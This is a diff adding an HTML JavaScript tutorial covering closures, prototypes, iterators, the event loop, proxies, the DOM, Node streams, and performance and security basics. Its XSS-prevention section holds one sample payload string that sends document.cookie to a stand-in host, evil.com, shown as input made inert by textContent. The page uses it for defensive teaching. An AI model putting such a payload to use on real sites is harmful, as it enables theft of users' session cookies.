+        <pre><span class="kw">class</span> <span class="cls">DatabaseError</span> <span class="kw">extends</span> <span class="cls">Error</span> {
+  <span class="fn">constructor</span>(<span class="vr">message</span>, <span class="vr">options</span>) {
+    <span class="kw">super</span>(<span class="vr">message</span>, <span class="vr">options</span>);
+    <span class="kw">this</span>.name <span class="op">=</span> <span class="str">"DatabaseError"</span>;
+  }
+}
+
+<span class="kw">try</span> {
+  <span class="kw">try</span> {
+    <span class="kw">throw new</span> <span class="cls">Error</span>(<span class="str">"Connection Timeout"</span>);
+  } <span class="kw">catch</span> (<span class="vr">err</span>) {
+    <span class="kw">throw new</span> <span class="cls">DatabaseError</span>(<span class="str">"Failed to retrieve data"</span>, { cause: <span class="vr">err</span> });
+  }
+} <span class="kw">catch</span> (<span class="vr">dbErr</span>) {
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">dbErr</span>.message);
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="str">"Root Cause:"</span>, <span class="vr">dbErr</span>.cause.message);
+}</pre>
+      </div>
+      <div class="output">Failed to retrieve data<br>Root Cause: Connection Timeout</div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 6 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 06</div>
+    <h2>Functions, Scope &amp; Closures</h2>
+    <p class="ch-desc">Master function execution contexts, arrow functions, lexical scope environments, currying, and the execution bindings of the "this" keyword.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>6.1 Closures and Lexical Environments</h3>
+      <p>A closure is a function that retains access to its lexical scope environment, even when that function is executed outside its original scope. This enables data encapsulation and private variables.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">closure-mechanics.js</span></div>
+        <pre><span class="kw">function</span> <span class="fn">createBankAccount</span>(<span class="vr">owner</span>, <span class="vr">initialBalance</span>) {
+  <span class="kw">let</span> <span class="vr">balance</span> <span class="op">=</span> <span class="vr">initialBalance</span>; // Private variable
+  
+  <span class="kw">return</span> {
+    <span class="fn">deposit</span>(<span class="vr">amount</span>) {
+      <span class="vr">balance</span> <span class="op">+=</span> <span class="vr">amount</span>;
+      <span class="kw">return</span> <span class="vr">balance</span>;
+    },
+    <span class="fn">withdraw</span>(<span class="vr">amount</span>) {
+      <span class="kw">if</span> (<span class="vr">amount</span> <span class="op">&gt;</span> <span class="vr">balance</span>) <span class="kw">return</span> <span class="str">"Insufficient funds"</span>;
+      <span class="vr">balance</span> <span class="op">-=</span> <span class="vr">amount</span>;
+      <span class="kw">return</span> <span class="vr">balance</span>;
+    },
+    <span class="fn">getBalance</span>() {
+      <span class="kw">return</span> <span class="vr">balance</span>;
+    }
+  };
+}
+
+<span class="kw">const</span> <span class="vr">account</span> <span class="op">=</span> <span class="fn">createBankAccount</span>(<span class="str">"Alice"</span>, <span class="num">1000</span>);
+<span class="vr">account</span>.<span class="fn">deposit</span>(<span class="num">500</span>);
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">account</span>.<span class="fn">getBalance</span>()); <span class="cmt">// 1500</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">account</span>.balance);      <span class="cmt">// undefined (isolated scope)</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>6.2 Currying and Higher-Order Functions</h3>
+      <p>Currying translates a function that takes multiple arguments into a sequence of functions, each taking a single argument.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">currying.js</span></div>
+        <pre><span class="cmt">// Non-curried function</span>
+<span class="kw">const</span> <span class="fn">log</span> <span class="op">=</span> (<span class="vr">date</span>, <span class="vr">type</span>, <span class="vr">message</span>) <span class="op">=&gt;</span> <span class="str">"["</span> <span class="op">+</span> <span class="vr">date</span> <span class="op">+</span> <span class="str">"] ["</span> <span class="op">+</span> <span class="vr">type</span> <span class="op">+</span> <span class="str">"] "</span> <span class="op">+</span> <span class="vr">message</span>;
+
+<span class="cmt">// Curried function</span>
+<span class="kw">const</span> <span class="fn">curriedLog</span> <span class="op">=</span> <span class="vr">date</span> <span class="op">=&gt;</span> <span class="vr">type</span> <span class="op">=&gt;</span> <span class="vr">message</span> <span class="op">=&gt;</span> <span class="str">"["</span> <span class="op">+</span> <span class="vr">date</span> <span class="op">+</span> <span class="str">"] ["</span> <span class="op">+</span> <span class="vr">type</span> <span class="op">+</span> <span class="str">"] "</span> <span class="op">+</span> <span class="vr">message</span>;
+
+<span class="kw">const</span> <span class="vr">logToday</span> <span class="op">=</span> <span class="fn">curriedLog</span>(<span class="str">"2026-07-16"</span>);
+<span class="kw">const</span> <span class="vr">logTodayError</span> <span class="op">=</span> <span class="fn">logToday</span>(<span class="str">"ERROR"</span>);
+
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">logTodayError</span>(<span class="str">"Database connection failed"</span>));</pre>
+      </div>
+      <div class="output">[2026-07-16] [ERROR] Database connection failed</div>
+    </div>
+
+    <div class="section">
+      <h3>6.3 Explicit "this" Binding</h3>
+      <p>You can explicitly bind the value of this using call, apply, or bind.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">explicit-binding.js</span></div>
+        <pre><span class="kw">function</span> <span class="fn">showDetails</span>(<span class="vr">city</span>, <span class="vr">country</span>) {
+  <span class="kw">return</span> <span class="kw">this</span>.name <span class="op">+</span> <span class="str">" lives in "</span> <span class="op">+</span> <span class="vr">city</span> <span class="op">+</span> <span class="str">", "</span> <span class="op">+</span> <span class="vr">country</span>;
+}
+
+<span class="kw">const</span> <span class="vr">person</span> <span class="op">=</span> { name: <span class="str">"Bob"</span> };
+
+<span class="cmt">// 1. Call: Invokes the function immediately with arguments passed individually</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">showDetails</span>.<span class="fn">call</span>(<span class="vr">person</span>, <span class="str">"Bangalore"</span>, <span class="str">"India"</span>));
+
+<span class="cmt">// 2. Apply: Invokes the function immediately with arguments passed as an array</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">showDetails</span>.<span class="fn">apply</span>(<span class="vr">person</span>, [<span class="str">"San Jose"</span>, <span class="str">"USA"</span>]));
+
+<span class="cmt">// 3. Bind: Returns a new function with "this" permanently bound</span>
+<span class="kw">const</span> <span class="fn">boundFunc</span> <span class="op">=</span> <span class="fn">showDetails</span>.<span class="fn">bind</span>(<span class="vr">person</span>, <span class="str">"London"</span>);
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">boundFunc</span>(<span class="str">"UK"</span>));</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 7 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 07</div>
+    <h2>OOP &amp; Prototypal Inheritance</h2>
+    <p class="ch-desc">Explore JavaScript's prototype chain, class syntax, private attributes, accessor properties, and structural freeze methods.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>7.1 The Prototype Chain</h3>
+      <p>JavaScript uses prototypal inheritance. Every object has an internal link (historically referenced as __proto__) pointing to another prototype object. When accessing a property, the runtime travels up this chain until the property is found or the chain ends at Object.prototype.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">prototypal-chain.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">vehicle</span> <span class="op">=</span> {
+  engine: <span class="kw">true</span>,
+  <span class="fn">start</span>() { <span class="kw">return</span> <span class="str">"Vroom"</span>; }
+};
+
+<span class="kw">const</span> <span class="vr">car</span> <span class="op">=</span> <span class="cls">Object</span>.<span class="fn">create</span>(<span class="vr">vehicle</span>);
+<span class="vr">car</span>.wheels <span class="op">=</span> <span class="num">4</span>;
+
+<span class="cmt">// Inherits start() method from vehicle</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">car</span>.<span class="fn">start</span>());
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="cls">Object</span>.<span class="fn">getPrototypeOf</span>(<span class="vr">car</span>) <span class="op">===</span> <span class="vr">vehicle</span>); <span class="cmt">// true</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>7.2 ES6 Classes &amp; Private Fields</h3>
+      <p>ES6 classes provide a cleaner syntax to write prototypal inheritance. In ES2022, private properties and methods can be declared using the # prefix.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">class-es6.js</span></div>
+        <pre><span class="kw">class</span> <span class="cls">Person</span> {
+  #socialSecurityNumber; // Private field
+
+  <span class="fn">constructor</span>(<span class="vr">name</span>, <span class="vr">ssn</span>) {
+    <span class="kw">this</span>.name <span class="op">=</span> <span class="vr">name</span>;
+    <span class="kw">this</span>.#socialSecurityNumber <span class="op">=</span> <span class="vr">ssn</span>;
+  }
+
+  <span class="fn">getSSN</span>() {
+    <span class="kw">return</span> <span class="kw">this</span>.#socialSecurityNumber;
+  }
+}
+
+<span class="kw">const</span> <span class="vr">john</span> <span class="op">=</span> <span class="kw">new</span> <span class="cls">Person</span>(<span class="str">"John Doe"</span>, <span class="str">"123-45-6789"</span>);
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">john</span>.name);
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">john</span>.getSSN());</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>7.3 Restricting Mutations: Freeze vs Seal</h3>
+      <p>JavaScript provides methods to restrict changes to objects:</p>
+      <ul>
+        <li>Object.preventExtensions(obj): Stops new properties from being added.</li>
+        <li>Object.seal(obj): Stops adding/deleting properties. Existing properties can still be modified.</li>
+        <li>Object.freeze(obj): Stops adding, deleting, or modifying properties. The object becomes read-only.</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 8 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 08</div>
+    <h2>Arrays, Iterators &amp; Generators</h2>
+    <p class="ch-desc">Learn about array algorithms, typed arrays, the iterator protocol, and generators.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>8.1 Common Array Methods</h3>
+      <p>Modern JavaScript has powerful methods for manipulating arrays:</p>
+      <ul>
+        <li>map(): Transforms every element and returns a new array.</li>
+        <li>filter(): Returns a new array containing elements that pass a test.</li>
+        <li>reduce(): Runs a reducer function on each element, returning a single value.</li>
+        <li>flat() &amp; flatMap(): Flattens nested arrays.</li>
+      </ul>
+    </div>
+
+    <div class="section">
+      <h3>8.2 Iterator Protocol</h3>
+      <p>An object is an iterable if it implements the [Symbol.iterator] method, which returns an object containing a next() method.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">custom-iterator.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">rangeObj</span> <span class="op">=</span> {
+  start: <span class="num">1</span>,
+  end: <span class="num">3</span>,
+  [<span class="cls">Symbol</span>.iterator]() {
+    <span class="kw">let</span> <span class="vr">current</span> <span class="op">=</span> <span class="kw">this</span>.start;
+    <span class="kw">let</span> <span class="vr">last</span> <span class="op">=</span> <span class="kw">this</span>.end;
+    <span class="kw">return</span> {
+      <span class="fn">next</span>() {
+        <span class="kw">if</span> (<span class="vr">current</span> <span class="op">&lt;=</span> <span class="vr">last</span>) {
+          <span class="kw">return</span> { value: <span class="vr">current</span><span class="op">++</span>, done: <span class="kw">false</span> };
+        }
+        <span class="kw">return</span> { done: <span class="kw">true</span> };
+      }
+    };
+  }
+};
+
+<span class="kw">for</span> (<span class="kw">const</span> <span class="vr">v</span> <span class="kw">of</span> <span class="vr">rangeObj</span>) {
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">v</span>);
+}</pre>
+      </div>
+      <div class="output">1<br>2<br>3</div>
+    </div>
+
+    <div class="section">
+      <h3>8.3 Generator Functions</h3>
+      <p>Generators are functions that can be paused and resumed using the function* syntax and the yield keyword.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">generators.js</span></div>
+        <pre><span class="kw">function</span><span class="op">*</span> <span class="fn">sequenceGenerator</span>() {
+  <span class="kw">yield</span> <span class="str">"Step A"</span>;
+  <span class="kw">yield</span> <span class="str">"Step B"</span>;
+}
+
+<span class="kw">const</span> <span class="vr">gen</span> <span class="op">=</span> <span class="fn">sequenceGenerator</span>();
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">gen</span>.<span class="fn">next</span>().value); // Step A
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">gen</span>.<span class="fn">next</span>().value); // Step B</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 9 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 09</div>
+    <h2>Async JS &amp; The Event Loop</h2>
+    <p class="ch-desc">Learn about the Event Loop phases, microtasks vs macrotasks, Promise APIs, and clean async/await code structures.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>9.1 The Event Loop Architecture</h3>
+      <p>JavaScript is a single-threaded language. To handle asynchronous code without blocking execution, the engine uses the Event Loop. When asynchronous APIs finish (like setTimeout or fetch), they place their callbacks into one of two queues:</p>
+      <ul>
+        <li><strong>Microtask Queue</strong>: Holds Promise callbacks, queueMicrotask, and MutationObservers. This queue has priority and is completely emptied before the engine continues.</li>
+        <li><strong>Macrotask Queue</strong>: Holds callbacks for events like timers (setTimeout), I/O operations, and user interaction events.</li>
+      </ul>
+    </div>
+
+    <div class="section">
+      <h3>9.2 Promise Combinators</h3>
+      <table class="tbl">
+        <tr><th>API</th><th>Behavior</th></tr>
+        <tr><td>Promise.all()</td><td>Waits for all promises to resolve. Rejects immediately if any promise fails.</td></tr>
+        <tr><td>Promise.allSettled()</td><td>Waits for all promises to complete (resolved or rejected). Never rejects.</td></tr>
+        <tr><td>Promise.race()</td><td>Returns the result of the first promise that settles (resolved or rejected).</td></tr>
+        <tr><td>Promise.any()</td><td>Returns the value of the first promise that resolves. Rejects only if all promises fail.</td></tr>
+      </table>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">promise-combinators.js</span></div>
+        <pre><span class="kw">const</span> <span class="fn">delay</span> <span class="op">=</span> (<span class="vr">ms</span>, <span class="vr">val</span>, <span class="vr">shouldReject</span> <span class="op">=</span> <span class="kw">false</span>) <span class="op">=&gt;</span> 
+  <span class="kw">new</span> <span class="cls">Promise</span>((<span class="vr">resolve</span>, <span class="vr">reject</span>) <span class="op">=&gt;</span> 
+    <span class="fn">setTimeout</span>(() <span class="op">=&gt;</span> <span class="vr">shouldReject</span> ? <span class="vr">reject</span>(<span class="str">"Error"</span>) : <span class="vr">resolve</span>(<span class="vr">val</span>), <span class="vr">ms</span>)
+  );
+
+<span class="cls">Promise</span>.<span class="fn">allSettled</span>([
+  <span class="fn">delay</span>(<span class="num">100</span>, <span class="str">"Resolved Val"</span>),
+  <span class="fn">delay</span>(<span class="num">200</span>, <span class="str">""</span>, <span class="kw">true</span>)
+]).<span class="fn">then</span>(<span class="vr">results</span> <span class="op">=&gt;</span> <span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">results</span>));</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 10 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 10</div>
+    <h2>ES6+ Meta-programming &amp; ESM</h2>
+    <p class="ch-desc">Learn about dynamic Object Proxies, Reflection, Symbols, and the differences between ES Modules and CommonJS.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>10.1 Proxy and Reflect</h3>
+      <p>A Proxy wraps an object, allowing you to intercept and customize fundamental operations (like property lookup, assignment, and function invocation).</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">proxies.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">targetObj</span> <span class="op">=</span> { message: <span class="str">"Hello"</span> };
+
+<span class="kw">const</span> <span class="vr">proxyObj</span> <span class="op">=</span> <span class="kw">new</span> <span class="cls">Proxy</span>(<span class="vr">targetObj</span>, {
+  <span class="fn">get</span>(<span class="vr">target</span>, <span class="vr">property</span>) {
+    <span class="kw">return</span> <span class="vr">property</span> <span class="kw">in</span> <span class="vr">target</span> 
+      ? <span class="vr">target</span>[<span class="vr">property</span>].<span class="fn">toUpperCase</span>() 
+      : <span class="str">"Property not found"</span>;
+  }
+});
+
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">proxyObj</span>.message); // HELLO
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">proxyObj</span>.unknown); // Property not found</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>10.2 ESM vs CommonJS</h3>
+      <p>ES Modules (ESM) are the official standard for modules in JavaScript. CommonJS is the legacy module system used historically in Node.js.</p>
+      <table class="tbl">
+        <tr><th>Module System</th><th>Syntax</th><th>Resolution</th></tr>
+        <tr><td><strong>ES Modules</strong></td><td>import / export</td><td>Static analysis at compile-time. Supports tree-shaking.</td></tr>
+        <tr><td><strong>CommonJS</strong></td><td>require / module.exports</td><td>Dynamic loading at runtime.</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 11 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 11</div>
+    <h2>Browser, Web APIs &amp; DOM</h2>
+    <p class="ch-desc">Learn how browsers render pages, capture and bubble events, handle DOM changes, and manage web storage APIs.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>11.1 DOM Performance: Reflows and Repaints</h3>
+      <p>Manipulating the DOM can be expensive because it can trigger page recalculations:</p>
+      <ul>
+        <li><strong>Reflow</strong>: Occurs when the layout, size, or position of elements changes. This forces the browser to recalculate the page layout.</li>
+        <li><strong>Repaint</strong>: Occurs when visual styles change (like background color or visibility) without affecting the layout.</li>
+      </ul>
+      <div class="callout tip">
+        <span class="ci">&#128161;</span>
+        <div>
+          To minimize reflows, make changes to an offscreen DOM node or a DocumentFragment before adding it back to the active page DOM.
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>11.2 Event Bubbling and Capturing</h3>
+      <p>Events propagate through the DOM in three phases:</p>
+      <ol>
+        <li><strong>Capture Phase</strong>: The event travels down from the global window node to the target element.</li>
+        <li><strong>Target Phase</strong>: The event fires on the target element.</li>
+        <li><strong>Bubble Phase</strong>: The event bubbles back up from the target element to the window.</li>
+      </ol>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">event-delegation.js</span></div>
+        <pre><span class="cmt">// Event delegation pattern</span>
+<span class="kw">const</span> <span class="vr">parentContainer</span> <span class="op">=</span> document.<span class="fn">getElementById</span>(<span class="str">"menu"</span>);
+
+<span class="vr">parentContainer</span>.<span class="fn">addEventListener</span>(<span class="str">"click"</span>, (<span class="vr">event</span>) <span class="op">=&gt;</span> {
+  <span class="cmt">// Delegate listener to handle button clicks</span>
+  <span class="kw">if</span> (<span class="vr">event</span>.target.<span class="vr">tagName</span> <span class="op">===</span> <span class="str">"BUTTON"</span>) {
+    <span class="fn">console</span>.<span class="fn">log</span>(<span class="str">"Button clicked ID:"</span>, <span class="vr">event</span>.target.dataset.id);
+  }
+});</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 12 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 12</div>
+    <h2>Node.js Architecture &amp; Backend</h2>
+    <p class="ch-desc">Explore the Node.js runtime, how libuv provides non-blocking I/O, core modules, streams, and event handlers.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>12.1 Node.js Architecture (V8 &amp; Libuv)</h3>
+      <p>Node.js is a runtime environment that runs JavaScript code outside the browser. It uses the V8 engine to execute code, and a library called libuv to handle asynchronous, non-blocking I/O operations.</p>
+      <p><strong>Libuv</strong> manages the system Event Loop and provides a Thread Pool to run heavy tasks (like file system operations or cryptography) in the background, keeping the main JavaScript execution thread free.</p>
+    </div>
+
+    <div class="section">
+      <h3>12.2 Working with Streams</h3>
+      <p>Streams allow you to process data in chunks piece-by-piece, without loading the entire file into memory. This is highly efficient for handling large files or network responses.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">streams.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">fs</span> <span class="op">=</span> <span class="fn">require</span>(<span class="str">"fs"</span>);
+
+<span class="cmt">// Read a file in chunks using a readable stream</span>
+<span class="kw">const</span> <span class="vr">readStream</span> <span class="op">=</span> <span class="vr">fs</span>.<span class="fn">createReadStream</span>(<span class="str">"large-dataset.csv"</span>, { encoding: <span class="str">"utf8"</span> });
+
+<span class="vr">readStream</span>.<span class="fn">on</span>(<span class="str">"data"</span>, (<span class="vr">chunk</span>) <span class="op">=&gt;</span> {
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="str">"Received chunk of data..."</span>);
+  <span class="cmt">// Process chunk</span>
+});</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 13 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 13</div>
+    <h2>Tooling, Optimization &amp; Security</h2>
+    <p class="ch-desc">Learn how to optimize performance with debouncing and throttling, configure modern build tools, and protect against security vulnerabilities.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>13.1 Performance: Debounce vs Throttle</h3>
+      <p>These techniques limit how often a function can run over time:</p>
+      <ul>
+        <li><strong>Debounce</strong>: Delays execution until a specified time has passed since the last call. Ideal for autocomplete search inputs.</li>
+        <li><strong>Throttle</strong>: Limits execution to once within a specified time window. Ideal for window scroll or resize event handlers.</li>
+      </ul>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">debounce-throttle.js</span></div>
+        <pre><span class="cmt">// Debounce implementation</span>
+<span class="kw">function</span> <span class="fn">debounce</span>(<span class="vr">func</span>, <span class="vr">delay</span>) {
+  <span class="kw">let</span> <span class="vr">timeoutId</span>;
+  <span class="kw">return</span> <span class="kw">function</span>(...<span class="vr">args</span>) {
+    <span class="fn">clearTimeout</span>(<span class="vr">timeoutId</span>);
+    <span class="vr">timeoutId</span> <span class="op">=</span> <span class="fn">setTimeout</span>(() <span class="op">=&gt;</span> <span class="vr">func</span>.<span class="fn">apply</span>(<span class="kw">this</span>, <span class="vr">args</span>), <span class="vr">delay</span>);
+  };
+}
+
+<span class="cmt">// Throttle implementation</span>
+<span class="kw">function</span> <span class="fn">throttle</span>(<span class="vr">func</span>, <span class="vr">limit</span>) {
+  <span class="kw">let</span> <span class="vr">inThrottle</span>;
+  <span class="kw">return</span> <span class="kw">function</span>(...<span class="vr">args</span>) {
+    <span class="kw">if</span> (<span class="op">!</span><span class="vr">inThrottle</span>) {
+      <span class="vr">func</span>.<span class="fn">apply</span>(<span class="kw">this</span>, <span class="vr">args</span>);
+      <span class="vr">inThrottle</span> <span class="op">=</span> <span class="kw">true</span>;
+      <span class="fn">setTimeout</span>(() <span class="op">=&gt;</span> <span class="vr">inThrottle</span> <span class="op">=</span> <span class="kw">false</span>, <span class="vr">limit</span>);
+    }
+  };
+}</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>13.2 Security Vulnerabilities (XSS &amp; CSRF)</h3>
+      <p>Security is critical when building web applications:</p>
+      <ul>
+        <li><strong>Cross-Site Scripting (XSS)</strong>: Occurs when an attacker injects malicious scripts into your site. To prevent this, always sanitize user input and use element.textContent instead of element.innerHTML.</li>
+        <li><strong>Cross-Site Request Forgery (CSRF)</strong>: Occurs when a malicious site tricks a user's browser into making unauthorized requests to your site. To prevent this, use anti-CSRF tokens and configure SameSite cookie attributes.</li>
+      </ul>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">xss-prevention.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">userInput</span> <span class="op">=</span> <span class="str">"&lt;script&gt;fetch('evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;"</span>;
+
+// VULNERABLE to XSS
+// div.innerHTML = userInput;
+
+// SAFE from XSS
+<span class="kw">const</span> <span class="vr">div</span> <span class="op">=</span> document.<span class="fn">createElement</span>(<span class="str">"div"</span>);
+<span class="vr">div</span>.textContent <span class="op">=</span> <span class="vr">userInput</span>; // Browser renders this as plain text, script does not execute</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>13.3 Design Patterns &amp; Best Practices</h3>
+      <div class="sumbox">
+        <h4>Critical Production Rules</h4>
+        <ul>
+          <li><strong>Strict Equality</strong>: Always use === instead of == to avoid unexpected type coercion.</li>
+          <li><strong>Variable Bindings</strong>: Use const by default, let when a variable needs to be reassigned, and avoid using var.</li>
+          <li><strong>Error Handling</strong>: Never leave a catch block empty. Always handle errors or log them to an error tracking service.</li>
+          <li><strong>Performance</strong>: Avoid memory leaks by cleaning up event listeners and clearing intervals/timeouts when components are unmounted.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== PRINT FOOTER ==================== -->
+<div class="print-cta">
+  <p style="font-size:15px;color:var(--text-light);margin-bottom:16px;">
+    To save this document as a PDF, press <strong>Ctrl+P</strong> (Windows) or <strong>&#8984;+P</strong> (Mac) and choose <strong>"Save as PDF"</strong>.
+  </p>
+  <button class="print-btn" onclick="window.print()">Print / Save as PDF</button>
+</div>
+
+</body>
+</html>
